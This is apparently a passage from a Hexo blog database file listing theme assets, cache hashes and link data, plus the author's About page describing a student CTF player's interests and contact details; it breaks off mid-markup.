{"meta":{"version":1,"warehouse":"4.0.1"},"models":{"Asset":[{"_id":"source/CNAME","path":"CNAME","modified":1,"renderable":0},{"_id":"source/images/avatar.jpg","path":"images/avatar.jpg","modified":1,"renderable":0},{"_id":"source/images/favicon.ico","path":"images/favicon.ico","modified":1,"renderable":0},{"_id":"themes/pure/source/css/style.css","path":"css/style.css","modified":1,"renderable":1},{"_id":"themes/pure/source/css/style.min.css","path":"css/style.min.css","modified":1,"renderable":1},{"_id":"themes/pure/source/fonts/README.md","path":"fonts/README.md","modified":1,"renderable":1},{"_id":"themes/pure/source/fonts/iconfont.eot","path":"fonts/iconfont.eot","modified":1,"renderable":1},{"_id":"themes/pure/source/fonts/iconfont.svg","path":"fonts/iconfont.svg","modified":1,"renderable":1},{"_id":"themes/pure/source/fonts/iconfont.ttf","path":"fonts/iconfont.ttf","modified":1,"renderable":1},{"_id":"themes/pure/source/fonts/iconfont.woff","path":"fonts/iconfont.woff","modified":1,"renderable":1},{"_id":"themes/pure/source/js/application.js","path":"js/application.js","modified":1,"renderable":1},{"_id":"themes/pure/source/js/application.min.js","path":"js/application.min.js","modified":1,"renderable":1},{"_id":"themes/pure/source/js/insight.js","path":"js/insight.js","modified":1,"renderable":1},{"_id":"themes/pure/source/js/jquery.min.js","path":"js/jquery.min.js","modified":1,"renderable":1},{"_id":"themes/pure/source/js/plugin.js","path":"js/plugin.js","modified":1,"renderable":1},{"_id":"themes/pure/source/js/plugin.js.map","path":"js/plugin.js.map","modified":1,"renderable":1},{"_id":"themes/pure/source/js/plugin.min.js","path":"js/plugin.min.js","modified":1,"renderable":1}],"Cache":[{"_id":"source/CNAME","hash":"7c552751c6fabfd12c19e5fb8073af72653afcff","modified":1684584635623},{"_id":"source/_data/links.yml","hash":"2af72a694066127a8cb70b8ec85f56ffbfd648be","modified":1684590669818},{"_id":"source/_posts/[Pwn]-StackOverflow-Overview.md","hash":"e52674d02bfc65d8638f7102a9cfc16cd648c7e9","modified":1687246202067},{"_id":"source/about/index.md","hash":"b31bd1df8e02864d98f9e4c20e9a1c9caf91a884","modified":1682407623632},{"_id":"source/categories/index.md","hash":"339fc95dce754bff8340337e0f288515907e305c","modified":1682407623633},{"_id":"source/links/index.md","hash":"3c712a18c2da4dd688109b9d3a509865086035ad","modified":1684590609077},{"_id":"source/images/favicon.ico","hash":"f5a483a5b2166e99b870eb6526d84bf08d31e038","modified":1682407623633},{"_id":"source/_posts/[Pwn]-heap-exploation-up-to-2.31.md","hash":"40486b22f1375ee9bfd09cb2d4a0a84a6f80494e","modified":1687330515885},{"_id":"source/repository/index.md","hash":"0c8e1af832cac0168377062437b8c9edb799d77c","modified":1682407623633},{"_id":"source/images/avatar.jpg","hash":"6d028ebf4da46a77789ed6a76834817f4cb3c200","modified":1682407623633},{"_id":"source/tags/index.md","hash":"36ff0d3718ca5b0d9754c4d85151e3787719a01c","modified":1682407623633},{"_id":"themes/pure/.gitignore","hash":"dbb41a2f30c98cb9de173d82736c46266c901cda","modified":1684582699416},{"_id":"themes/pure/LICENSE","hash":"c480fce396b23997ee23cc535518ffaaf7f458f8","modified":1684582699416},{"_id":"themes/pure/package.json","hash":"a61723eead5cae2c4d9f0f05cf40d2de7c286fee","modified":1684582699419},{"_id":"themes/pure/_config.yml","hash":"8f5ab98b9811be0d3febef3e93ea983b4b13f6cb","modified":1684586165802},{"_id":"themes/pure/_config.yml.example","hash":"4714f87fdb6d4a6ea5ece84f4fe37f922337f14d","modified":1684582699416},{"_id":"themes/pure/languages/default.yml","hash":"167ea0db98f4db156ea68c4644f64c0287ae2b6f","modified":1684582699417},{"_id":"themes/pure/languages/zh-CN.yml","hash":"057ebc043f09449af9768791c89c86dfc2938365","modified":1684582699417},{"_id":"themes/pure/README.cn.md","hash":"ddf15a1feb7a2630210aae0528df3504fca23b5e","modified":1684582699416},{"_id":"themes/pure/scripts/thumbnail.js","hash":"e667a611f9baac270281b765832020d50bf8fb7f","modified":1684582699426},{"_id":"themes/pure/languages/zh-TW.yml","hash":"6d27c3114be539b8783ffce944f68b2e26a8c3b9","modified":1684582699417},{"_id":"themes/pure/languages/en.yml","hash":"167ea0db98f4db156ea68c4644f64c0287ae2b6f","modified":1684582699417},{"_id":"themes/pure/README.md","hash":"5861cec81712af9197a210fd5212d007aad8b0de","modified":1684582699416},{"_id":"themes/pure/layout/about.ejs","hash":"4f5c769e183249b12eb9d3141432bc0039519730","modified":1684582699419},{"_id":"themes/pure/layout/books.ejs","hash":"6c64719cd7071b5319b01339aa524fdaab391385","modified":1684582699419},{"_id":"themes/pure/layout/archive.ejs","hash":"0e9e67a82202ca3971be59579744d43ec6696bbf","modified":1684582699419},{"_id":"themes/pure/layout/categories.ejs","hash":"22a2bc1712dd9ba1a3027e875d636132d334fb00","modified":1684582699419},{"_id":"themes/pure/layout/category.ejs","hash":"3ca5651bbce7b0c280c906468f2eb18c2e55ebcb","modified":1684582699419},{"_id":"themes/pure/layout/index.ejs","hash":"07825d8d8b21eb7b694f5585567b9df5c5a91a60","modified":1684582699419},{"_id":"themes/pure/layout/layout.ejs","hash":"a29ab2e881954a252bfc0dc1a7eb5aa52768dd2a","modified":1684582699419},{"_id":"themes/pure/layout/page.ejs","hash":"5c27475c176627e6e2e6a16172eb6980e56bcaff","modified":1684582699419},{"_id":"themes/pure/layout/post.ejs","hash":"5c27475c176627e6e2e6a16172eb6980e56bcaff","modified":1684582699419},{"_id":"themes/pure/layout/repository.ejs","hash":"fe4b3e051a8b0debe9ee22c2cc2cc935d92ee23f","modified":1684582699419},{"_id":"themes/pure/layout/tag.ejs","hash":"df60564c162f7ad3422f8959dfea19351857a7cd","modified":1684582699419},{"_id":"themes/pure/layout/tags.ejs","hash":"29f19a6ed10f8b1f069259a7aeaaacddcfaa2ed4","modified":1684582699419},{"_id":"themes/pure/layout/links.ejs","hash":"77c5d1561e2c606c5b3bb39610133d84324074df","modified":1684582699419},{"_id":"themes/pure/.github/ISSUE_TEMPLATE/custom.md","hash":"84208538d48505ee8e49812cb336eb9882e08dc7","modified":1684582699416},{"_id":"themes/pure/.github/ISSUE_TEMPLATE/bug_report.md","hash":"83d211c67c12e8c1f6e9f796cfd0cecbf5160e15","modified":1684582699416},{"_id":"themes/pure/.github/ISSUE_TEMPLATE/feature_request.md","hash":"f6867a2f0417fe89a0f2008730ee19dd38422021","modified":1684582699416},{"_id":"themes/pure/_source/_data/gallery.yml","hash":"e2b3fad87be3d1cfde1effa655d39678ee90907e","modified":1684582699416},{"_id":"themes/pure/_source/404/index.md","hash":"8d493f624fdd29c8d0266767e56f343d549e16d8","modified":1684582699416},{"_id":"themes/pure/_source/_data/links.yml","hash":"2af72a694066127a8cb70b8ec85f56ffbfd648be","modified":1684589090624},{"_id":"themes/pure/_source/about/index.md","hash":"9c95cabb533409d06daefc4295021ad199761efc","modified":1684582699416},{"_id":"themes/pure/_source/books/index.md","hash":"cf4163959c23244059cbbbc1c0fe379cc3b2cb73","modified":1684582699416},{"_id":"themes/pure/_source/categories/index.md","hash":"5d2a4f103d27bebbe3eef1604649d0f5c6d86ac6","modified":1684582699416},{"_id":"themes/pure/_source/images/avatar.jpg","hash":"6d028ebf4da46a77789ed6a76834817f4cb3c200","modified":1682407623633},{"_id":"themes/pure/_source/images/favicon.ico","hash":"f5a483a5b2166e99b870eb6526d84bf08d31e038","modified":1682407623633},{"_id":"themes/pure/_source/images/thumb-default.png","hash":"e8403b97ed9251f9f5207765b0ce796c5000b4ba","modified":1684582699428},{"_id":"themes/pure/_source/links/index.md","hash":"febcf87eb0ab3c5080578275d25f3970bba39625","modified":1684582699416},{"_id":"themes/pure/_source/tags/index.md","hash":"42e9c904ea63b0a7dd4033e2e8f153225bc5cda5","modified":1684582699417},{"_id":"themes/pure/_source/repository/index.md","hash":"ed0e082c30f233dd5c140d188f1e4bce44bdbf79","modified":1684582699417},{"_id":"themes/pure/_source/images/xingqiu-qrcode.jpg","hash":"ef2c2848dc79db6df7c752510651ed8ba57f2daf","modified":1684582699428},{"_id":"themes/pure/source/fonts/README.md","hash":"c5772b99ad81291fb137b330813f866bdceea0a3","modified":1684582699427},{"_id":"themes/pure/source/fonts/iconfont.woff","hash":"78d29194287b8885d25212048c4f787705212a6e","modified":1684582699428},{"_id":"themes/pure/source/fonts/iconfont.eot","hash":"6819d9bb643bdeafc17bfecb0746ae641b018fdf","modified":1684582699427},{"_id":"themes/pure/source/fonts/iconfont.ttf","hash":"9b8837f9f79cf6ab794736301d0665345183a20c","modified":1684582699428},{"_id":"themes/pure/source/js/application.js","hash":"46d1fb207ce5f0acb83803f927985dfcea86f9ef","modified":1684582699428},{"_id":"themes/pure/source/js/application.min.js","hash":"34d765e982c7d6360c37f82202d99f63ac40e408","modified":1684582699428},{"_id":"themes/pure/source/js/insight.js","hash":"298e8ca42517984bd26f34caa4c45560b0e909ad","modified":1684582699428},{"_id":"themes/pure/layout/_common/head.ejs","hash":"a48ef0fa22712b29ec044b9e5134461f3a21c10d","modified":1684582699417},{"_id":"themes/pure/layout/_common/footer.ejs","hash":"cdc48ec70d9202b947f2a9334234d038d7014a7d","modified":1684582699417},{"_id":"themes/pure/layout/_common/header.ejs","hash":"3d739d1e2b2991927c08ec222db123830a44a519","modified":1684582699417},{"_id":"themes/pure/layout/_common/social.ejs","hash":"a35a2610e9da762df96587b76b51470507a88cad","modified":1684582699417},{"_id":"themes/pure/layout/_common/script.ejs","hash":"0031114d2a58f8601c2869f78ceedc75a10be90d","modified":1684582699417},{"_id":"themes/pure/layout/_search/index-mobile.ejs","hash":"c726e234c0166da69fdfbd3dd613a5eaf4c80258","modified":1684582699418},{"_id":"themes/pure/layout/_search/baidu.ejs","hash":"67aab280a3ea34429f086cc5c3de7de17727c567","modified":1684582699418},{"_id":"themes/pure/layout/_search/index.ejs","hash":"f8d5a9c3f777250f5fb6512bba585307f784d5cd","modified":1684582699418},{"_id":"themes/pure/layout/_search/swiftype.ejs","hash":"4baeca36e410181300ae7d47ba1fb4755bcfcff0","modified":1684582699418},{"_id":"themes/pure/layout/_search/insight.ejs","hash":"4af3e92ef98bedba9680d45699cb04dde4640536","modified":1684582699418},{"_id":"themes/pure/layout/_widget/archive.ejs","hash":"af8ad7f62877764b75d5272d9d899fd6c8e3845c","modified":1684582699418},{"_id":"themes/pure/layout/_widget/board.ejs","hash":"acd27451be52703e670ce0b313f2da6fa24071e4","modified":1684582699418},{"_id":"themes/pure/layout/_widget/tag.ejs","hash":"487628925da5fcac91463cdad3d9e55d071bd5ed","modified":1684582699419},{"_id":"themes/pure/layout/_widget/category.ejs","hash":"331b7642a0f58b9088b937436ab39076a4c5dd7e","modified":1684582699418},{"_id":"themes/pure/layout/_widget/tagcloud.ejs","hash":"3291108e5411c48b2c5b3e17adace6ffa90d1c29","modified":1684582699419},{"_id":"themes/pure/layout/_widget/recent_posts.ejs","hash":"8942d60311797a591ba2d157c5cdd23e85ceb694","modified":1684582699418},{"_id":"themes/pure/layout/_partial/archive-category.ejs","hash":"9c364fd6b5172890784141802f5f466241d233fd","modified":1684582699417},{"_id":"themes/pure/layout/_partial/archive-book.ejs","hash":"977f97f3636947006ad738e502858c46d4cd5ec7","modified":1684582699417},{"_id":"themes/pure/layout/_partial/archive-list.ejs","hash":"1081974f182e8e1ce452d701b8f6575b6dc45b0c","modified":1684582699417},{"_id":"themes/pure/layout/_partial/archive-link.ejs","hash":"fe4d9bf526d8176683cea89b8561ced571374db0","modified":1684582699417},{"_id":"themes/pure/layout/_partial/archive-post.ejs","hash":"13039fec017332029122ef99901755fcecbfc8ea","modified":1684582699417},{"_id":"themes/pure/layout/_partial/archive-tag.ejs","hash":"5de90244c3cedad531cccc03c40e5f9a3aef3c61","modified":1684582699417},{"_id":"themes/pure/layout/_partial/archive-repository.ejs","hash":"3464682ae0359ba23034ac40e8153699c37fb7be","modified":1684582699417},{"_id":"themes/pure/layout/_partial/article-about.ejs","hash":"7b80319daeb63401d1745b81cd9a6d1d21a4fb60","modified":1684582699417},{"_id":"themes/pure/layout/_partial/archive.ejs","hash":"4d6793f50d41fbd47dc50aa36b24d496006bba6c","modified":1684582699417},{"_id":"themes/pure/layout/_partial/article.ejs","hash":"0f9b71de0087d1f777d92c5a0f3873971aec5a5b","modified":1684582699417},{"_id":"themes/pure/layout/_partial/item-post.ejs","hash":"2f3790257d6ad07fdad2043b27950842c9011daa","modified":1684582699417},{"_id":"themes/pure/layout/_partial/sidebar-toc.ejs","hash":"fa9e2041c4a6e03f566545db1385c5ae1a80f879","modified":1684582699418},{"_id":"themes/pure/layout/_partial/pagination.ejs","hash":"c792537723b59f437967262c9575a20fac02e911","modified":1684582699417},{"_id":"themes/pure/layout/_partial/sidebar-about.ejs","hash":"46da1ee327b8af107335146bd8fc131eee6c9c4f","modified":1684582699418},{"_id":"themes/pure/layout/_partial/sidebar.ejs","hash":"2aa8a9f90838e7c105e75e6d3d03cbf860bb1239","modified":1684582699418},{"_id":"themes/pure/layout/_script/analytics.ejs","hash":"e756a81f8c20a187fb863b9689f2f1fa15e2f4e1","modified":1684582699418},{"_id":"themes/pure/layout/_script/comment.ejs","hash":"6f951510bab9dc15474b6664e0329defccf29a30","modified":1684582699418},{"_id":"themes/pure/layout/_script/mathjax.ejs","hash":"f618393ab971b2faa80d541f2e6a553d9ace9816","modified":1684582699418},{"_id":"themes/pure/layout/_script/fancybox.ejs","hash":"8f1be01e70a15b2c31ae57d8c6bce54622ebf8a7","modified":1684582699418},{"_id":"themes/pure/layout/_script/repository.ejs","hash":"32f0ac36fa68d8786506957338e552661f2f809c","modified":1684582699418},{"_id":"themes/pure/layout/_script/pv.ejs","hash":"fb9b5f16029f2ccef4b83cf4facfdcdd748b65b4","modified":1684582699418},{"_id":"themes/pure/layout/_script/search.ejs","hash":"7be33dc260ce788aa1a2cd3bd0386d95057533cb","modified":1684582699418},{"_id":"themes/pure/_source/images/favatar/SzsFox-logo.png","hash":"d71fcc73b7bc2a439d8c7ba461137856d190bd76","modified":1684582699428},{"_id":"themes/pure/_source/images/favatar/chuangzaoshi-logo.png","hash":"7fa5734072050952159a02d330bbc008b5a99122","modified":1684582699428},{"_id":"themes/pure/_source/images/donate/wechatpayimg.png","hash":"c0844d9a633696cb00ae64fde06f0f924f63b596","modified":1684582699428},{"_id":"themes/pure/layout/_partial/post/category.ejs","hash":"fcee6b4aef8b6c4627831ff8dbb2d73478511426","modified":1684582699417},{"_id":"themes/pure/_source/images/donate/alipayimg.png","hash":"9562f23f2eb57841c65dc769b6cc43a2cf0efa94","modified":1684582699428},{"_id":"themes/pure/layout/_partial/post/copyright.ejs","hash":"0a99c99992fb1e97bf5a57e05179f5680d69dcc8","modified":1684582699417},{"_id":"themes/pure/layout/_partial/post/comment.ejs","hash":"3c0da69fcea6ccfd97b82d50e740107a88eec5c4","modified":1684582699417},{"_id":"themes/pure/layout/_script/douban.ejs","hash":"ee21c4e7ccac26ff2ab6d1d178447fd11fea4d7e","modified":1684582699418},{"_id":"themes/pure/layout/_partial/post/date.ejs","hash":"7d4979652998abf92a64bfae8157b70d6e514057","modified":1684582699417},{"_id":"themes/pure/layout/_partial/post/pv.ejs","hash":"ec3ccf322432afc2761f860c5a3000ac34d46e4c","modified":1684582699417},{"_id":"themes/pure/layout/_partial/post/thumbnail.ejs","hash":"080d5c5f3e95accf51893a7092695fe32d34a087","modified":1684582699417},{"_id":"themes/pure/layout/_partial/post/nav.ejs","hash":"fcbe3695ae9b164a4a2d27a66a6827dcf3ee76f1","modified":1684582699417},{"_id":"themes/pure/layout/_partial/post/donate.ejs","hash":"a251dc34d660601a2e8b7d98b3bfe2b9023dbbce","modified":1684582699417},{"_id":"themes/pure/layout/_partial/post/tag.ejs","hash":"39f53ead07f75c181a7ba93e586dd1b8171620f1","modified":1684582699417},{"_id":"themes/pure/layout/_partial/post/title.ejs","hash":"2f275739b6f1193c123646a5a31f37d48644c667","modified":1684582699418},{"_id":"themes/pure/layout/_script/_comment/gitalk.ejs","hash":"de4c43d3056825c14283fe426b8cc677dea59617","modified":1684582699418},{"_id":"themes/pure/layout/_partial/post/wordcount.ejs","hash":"bd06c4c8449ed96aabf655fe1ae3be1f0707b81e","modified":1684582699418},{"_id":"themes/pure/layout/_partial/post/gallery.ejs","hash":"3d9d81a3c693ff2378ef06ddb6810254e509de5b","modified":1684582699417},{"_id":"themes/pure/layout/_script/_comment/disqus.ejs","hash":"a051e3eddc75586e69131c29ab8c89d69626e0fd","modified":1684582699418},{"_id":"themes/pure/layout/_script/_comment/livere.ejs","hash":"5ab997d5ee4475d2f89f882fab4a52648dbe0e30","modified":1684582699418},{"_id":"themes/pure/layout/_script/_comment/gitment.ejs","hash":"a64852076483395738a398deb4c10bdb0f3b7b71","modified":1684582699418},{"_id":"themes/pure/layout/_script/_comment/youyan.ejs","hash":"095649a173573d03b5845c2e331ec7be976b152a","modified":1684582699418},{"_id":"themes/pure/layout/_script/_comment/valine.ejs","hash":"acf81f9a59dc45f197d723f70484de5fcd166577","modified":1684582699418},{"_id":"themes/pure/layout/_script/_repository/gitee.ejs","hash":"0e1ecabe809f149ebe3ce3ac393f6e6155dd6780","modified":1684582699418},{"_id":"themes/pure/layout/_script/_search/baidu.ejs","hash":"9b60ffa2e2725a993e9cecfb81ddedd9b9361011","modified":1684582699418},{"_id":"themes/pure/layout/_script/_repository/legacy.ejs","hash":"b5e5c666e89550abb5004e35c7ef165c6edab62d","modified":1684582699418},{"_id":"themes/pure/layout/_script/_repository/github.ejs","hash":"a4762135de6816c85156e85886f50fb32b0adc89","modified":1684582699418},{"_id":"themes/pure/layout/_script/_analytics/baidu-analytics.ejs","hash":"f314be7860c1d5930f1600d010e3120ba5c85325","modified":1684582699418},{"_id":"themes/pure/layout/_script/_search/insight.ejs","hash":"3543c11d060feaf9381b5d87564b01ffef0e0a59","modified":1684582699418},{"_id":"themes/pure/layout/_script/_analytics/tencent-analytics.ejs","hash":"77defb41a1613a758ff5a6a5128c6107fc584190","modified":1684582699418},{"_id":"themes/pure/layout/_script/_analytics/google-analytics.ejs","hash":"54f1dc9375cbdb65464e0ac1b58847aa5e8bc6a5","modified":1684582699418},{"_id":"themes/pure/screenshot/pure-theme-black.png","hash":"10b40f398af7eb7e8ba2bf2f2a959d8779fc1fe1","modified":1684582699419},{"_id":"themes/pure/screenshot/pure-theme-purple.png","hash":"9855d2eb0acd23370209354f232471df8f4f72e2","modified":1684582699420},{"_id":"themes/pure/screenshot/pure-theme-green.png","hash":"12ec0c6033cb2762839fdf75434bbb4fbf946022","modified":1684582699420},{"_id":"themes/pure/_source/images/favatar/idesign-logo.png","hash":"6b150a2dbb9912b7a7662255c27e4d4baaecee71","modified":1684582699428},{"_id":"themes/pure/screenshot/pure-theme-blue.png","hash":"6146890a68d5ea9d343c48d50151ddd5a2a1872c","modified":1684582699420},{"_id":"themes/pure/screenshot/pure.png","hash":"8f4cfd8d7edfa4fbffdf375291302d9807f5cc1c","modified":1684582699421},{"_id":"themes/pure/source/js/plugin.js","hash":"a8524d42b8621bfaa06602a163c6a1f82702b91d","modified":1684582699429},{"_id":"themes/pure/source/js/jquery.min.js","hash":"5a9dcfbef655a2668e78baebeaa8dc6f41d8dabb","modified":1684582699429},{"_id":"themes/pure/source/js/plugin.min.js","hash":"07fe34638f9832702c5f81d8583c5e4e8b3d9659","modified":1684582699430},{"_id":"themes/pure/source/css/style.min.css","hash":"1d23abc76726ebe042f7df4749f00f8f73338444","modified":1684582699427},{"_id":"themes/pure/source/fonts/iconfont.svg","hash":"25929e6e74f7027acd1f6467a67e95b153bcd8d5","modified":1684582699428},{"_id":"themes/pure/source/js/plugin.js.map","hash":"1730c0cc660f863120aca0a439d7264e2e245fc5","modified":1684582699430},{"_id":"themes/pure/source/css/style.css","hash":"a115348d8810a8d6b608ffc7bb02b915b3f48534","modified":1684582699426},{"_id":"themes/pure/screenshot/pure.psd","hash":"a31cea40b45bdc31f051fca2f1e2f4ecbaee1a94","modified":1684582699426},{"_id":"public/baidusitemap.xml","hash":"f9e97b4237794b37727d7c970e7ff75bbe3b0f20","modified":1687330547608},{"_id":"public/atom.xml","hash":"180d7e760cd2f8a90bf9344fbb11eded8ef64706","modified":1687330547608},{"_id":"public/content.json","hash":"90598477e90b09961e71e2c4ac8e8d0074d7af27","modified":1687330547608},{"_id":"public/sitemap.xml","hash":"00bfbd6f83c91803f03ee32a45ca6568faec985f","modified":1687330547608},{"_id":"public/sitemap.txt","hash":"19f012a8d98340dbabda76ef53570cb6e28bb579","modified":1687330547608},{"_id":"public/about/index.html","hash":"dc6c9c283c82acb7d8d443e0e68d728d498cd3c3","modified":1687330547608},{"_id":"public/categories/index.html","hash":"1d6428bb9d7fae5012aaa4e59b64c1d1d8135646","modified":1687330547608},{"_id":"public/links/index.html","hash":"59c25325a481374d5da9837ef912f582bbbfbdf8","modified":1687330547608},{"_id":"public/repository/index.html","hash":"c80ae4ed8f5229b18caf9ed1c702e1778bf712fc","modified":1687330547608},{"_id":"public/tags/index.html","hash":"b81a7afa0d78e053e9aa85b5ad8926b7462ffd13","modified":1687330547608},{"_id":"public/archives/index.html","hash":"5b37a4bf1348d1abb37fa873c3c959f9dc7d4fae","modified":1687330547608},{"_id":"public/archives/2022/index.html","hash":"3e07e923d7e8b9ced82ef622bd1b13fc7e7088f2","modified":1687330547608},{"_id":"public/archives/2022/08/index.html","hash":"6c440fbfced2a82c946c7be8fc79fcc8d7f0874c","modified":1687330547608},{"_id":"public/archives/2023/index.html","hash":"ce0194bd93277765eab9beb95cc9d8288f9c71c6","modified":1687330547608},{"_id":"public/archives/2023/06/index.html","hash":"1789ce7800475b51d8108f5ac45c48404228b331","modified":1687330547608},{"_id":"public/categories/CTF/index.html","hash":"faab7f286047ff5d2b4a33ee42f43b6176a3e3c2","modified":1687330547608},{"_id":"public/index.html","hash":"c10eb51da08f3cbf69e6f992dd9d89197eeea378","modified":1687330547608},{"_id":"public/tags/Pwn/index.html","hash":"cc1114f84d71d4611be59b2069b538851e993049","modified":1687330547608},{"_id":"public/tags/CTF/index.html","hash":"d37d206c12a52736763bdc0a2bccebbfd701d16f","modified":1687330547608},{"_id":"public/2023/06/21/[Pwn]-heap-exploation-up-to-2.31/index.html","hash":"6b9508956f1a6d0b48e1633e6555c0764bc27a00","modified":1687330547608},{"_id":"public/2022/08/03/[Pwn]-StackOverflow-Overview/index.html","hash":"f3c90e011623f534212915ec9bc441c84dfbb13d","modified":1687330547608},{"_id":"public/images/favicon.ico","hash":"f5a483a5b2166e99b870eb6526d84bf08d31e038","modified":1687330547608},{"_id":"public/images/avatar.jpg","hash":"6d028ebf4da46a77789ed6a76834817f4cb3c200","modified":1687330547608},{"_id":"public/CNAME","hash":"7c552751c6fabfd12c19e5fb8073af72653afcff","modified":1687330547608},{"_id":"public/fonts/iconfont.eot","hash":"6819d9bb643bdeafc17bfecb0746ae641b018fdf","modified":1687330547608},{"_id":"public/fonts/iconfont.ttf","hash":"9b8837f9f79cf6ab794736301d0665345183a20c","modified":1687330547608},{"_id":"public/fonts/iconfont.woff","hash":"78d29194287b8885d25212048c4f787705212a6e","modified":1687330547608},{"_id":"public/fonts/README.html","hash":"7c4c6cf0fe08b0b7b3b6f42ebcb8be6d8a8f9d49","modified":1687330547608},{"_id":"public/js/application.js","hash":"46d1fb207ce5f0acb83803f927985dfcea86f9ef","modified":1687330547608},{"_id":"public/js/application.min.js","hash":"34d765e982c7d6360c37f82202d99f63ac40e408","modified":1687330547608},{"_id":"public/js/insight.js","hash":"298e8ca42517984bd26f34caa4c45560b0e909ad","modified":1687330547608},{"_id":"public/css/style.min.css","hash":"1d23abc76726ebe042f7df4749f00f8f73338444","modified":1687330547608},{"_id":"public/css/style.css","hash":"a115348d8810a8d6b608ffc7bb02b915b3f48534","modified":1687330547608},{"_id":"public/js/jquery.min.js","hash":"5a9dcfbef655a2668e78baebeaa8dc6f41d8dabb","modified":1687330547608},{"_id":"public/js/plugin.js","hash":"a8524d42b8621bfaa06602a163c6a1f82702b91d","modified":1687330547608},{"_id":"public/js/plugin.min.js","hash":"07fe34638f9832702c5f81d8583c5e4e8b3d9659","modified":1687330547608},{"_id":"public/fonts/iconfont.svg","hash":"25929e6e74f7027acd1f6467a67e95b153bcd8d5","modified":1687330547608},{"_id":"public/js/plugin.js.map","hash":"1730c0cc660f863120aca0a439d7264e2e245fc5","modified":1687330547608}],"Category":[{"name":"CTF","_id":"clj5d1j790004vwije2knaorr"}],"Data":[{"_id":"links","data":{"Cy":{"link":"https://cyccyyycyc.github.io/","avatar":"https://avatars.githubusercontent.com/u/93989939?v=4","desc":"Cyjj,我滴神"},"muyuan":{"link":"https://muyuansa.github.io/","avatar":"https://muyuansa.github.io/muyuansa","desc":"一位做AI的姐姐"}}}],"Page":[{"title":"About","layout":"About","comments":0,"sidebar":"none","_content":"\n\n\n# About me\n\nStudent and CTFer(pwn) of  SCSE(School of Cyber Science and Engineering), WHU.\n\nNow I focus on studying of Fuzz.\n\n# Interest\n\n## Games:\n\n- Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐)\n- Arknights(明日方舟)\n- JRPG\n  - The Legend of Heroes(轨迹系列)\n  - Persona(女神异闻录系列)\n  - ...\n- Light player of Act:\n  - Monster Hunter(怪物猎人系列)\n  - Devil May Cry(鬼泣)\n  - ...\n- Leisure:\n  - Rune Factory(符文工房系列)\n  - ...\n- RPG:\n  - Baldur' s gate(博德之门)\n  - Disco Elysium\n- other 3A\n\n\n\n## Films:\n\nFor films, I see it as the art of sight and sound. So I don't like the Drama(剧情片), but prefer the  films that have engrossing shots.\n\nHaving a preference for Europe、Japan  Director and films.\n\nRecently watched:\n\n- Love Letter, directed by いわい しゅんじ(岩井俊二)\n- 东邪西毒, directed by 王家卫\n- PROMARE, directed by いまいし ひろゆき(今石洋之)\n- Mobile Suit Gundam: Hathaway's Flash\n- ......\n\n## Books:\n\n- Literature\n- History\n- Monograph\n- Fiction\n- ......\n\n\n\n# Contact me\n\ne-mail:\n\n- Personal e-mail: wzhdxtx123@outlook.com\n\n- work e-mail: nemoxxw@whu.edu.cn\n\nQQ: 2499291623\n\nGithub: [github.com/Du-Mu](https://github.com/Du-Mu)","source":"about/index.md","raw":"---\ntitle: About\nlayout: About\ncomments: false\nsidebar: none\n---\n\n\n\n# About me\n\nStudent and CTFer(pwn) of  SCSE(School of Cyber Science and Engineering), WHU.\n\nNow I focus on studying of Fuzz.\n\n# Interest\n\n## Games:\n\n- Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐)\n- Arknights(明日方舟)\n- JRPG\n  - The Legend of Heroes(轨迹系列)\n  - Persona(女神异闻录系列)\n  - ...\n- Light player of Act:\n  - Monster Hunter(怪物猎人系列)\n  - Devil May Cry(鬼泣)\n  - ...\n- Leisure:\n  - Rune Factory(符文工房系列)\n  - ...\n- RPG:\n  - Baldur' s gate(博德之门)\n  - Disco Elysium\n- other 3A\n\n\n\n## Films:\n\nFor films, I see it as the art of sight and sound. So I don't like the Drama(剧情片), but prefer the  films that have engrossing shots.\n\nHaving a preference for Europe、Japan  Director and films.\n\nRecently watched:\n\n- Love Letter, directed by いわい しゅんじ(岩井俊二)\n- 东邪西毒, directed by 王家卫\n- PROMARE, directed by いまいし ひろゆき(今石洋之)\n- Mobile Suit Gundam: Hathaway's Flash\n- ......\n\n## Books:\n\n- Literature\n- History\n- Monograph\n- Fiction\n- ......\n\n\n\n# Contact me\n\ne-mail:\n\n- Personal e-mail: wzhdxtx123@outlook.com\n\n- work e-mail: nemoxxw@whu.edu.cn\n\nQQ: 2499291623\n\nGithub: [github.com/Du-Mu](https://github.com/Du-Mu)","date":"2023-04-25T07:27:03.632Z","updated":"2023-04-25T07:27:03.632Z","path":"about/index.html","_id":"clj5d1j6z0000vwij1tpfc5wh","content":"<h1>About me</h1>\n<p>Student and CTFer(pwn) of  SCSE(School of Cyber Science and Engineering), WHU.</p>\n<p>Now I focus on studying of Fuzz.</p>\n<h1>Interest</h1>\n<h2 id=\"Games\">Games:</h2>\n<ul>\n<li>Yu-Gi-Oh!(游戏王): Virtual World(电脑堺), Orcust(自奏圣乐)</li>\n<li>Arknights(明日方舟)</li>\n<li>JRPG\n<ul>\n<li>The Legend of Heroes(轨迹系列)</li>\n<li>Persona(女神异闻录系列)</li>\n<li>…</li>\n</ul>\n</li>\n<li>Light player of Act:\n<ul>\n<li>Monster Hunter(怪物猎人系列)</li>\n<li>Devil May Cry(鬼泣)</li>\n<li>…</li>\n</ul>\n</li>\n<li>Leisure:\n<ul>\n<li>Rune Factory(符文工房系列)</li>\n<li>…</li>\n</ul>\n</li>\n<li>RPG:\n<ul>\n<li>Baldur’ s gate(博德之门)</li>\n<li>Disco Elysium</li>\n</ul>\n</li>\n<li>other 3A</li>\n</ul>\n<h2 id=\"Films\">Films:</h2>\n<p>For films, I see it as the art of sight and sound. So I don’t like the Drama(剧情片), but prefer the  films that have engrossing shots.</p>\n<p>Having a preference for Europe、Japan  Director and films.</p>\n<p>Recently watched:</p>\n<ul>\n<li>Love Letter, directed by いわい しゅんじ(岩井俊二)</li>\n<li>东邪西毒, directed by 王家卫</li>\n<li>PROMARE, directed by いまいし ひろゆき(今石洋之)</li>\n<li>Mobile Suit Gundam: Hathaway’s Flash</li>\n<li>…</li>\n</ul>\n<h2 id=\"Books\">Books:</h2>\n<ul>\n<li>Literature</li>\n<li>History</li>\n<li>Monograph</li>\n<li>Fiction</li>\n<li>…</li>\n</ul>\n<h1>Contact me</h1>\n<p>e-mail:</p>\n<ul>\n<li>\n<p>Personal e-mail: <a 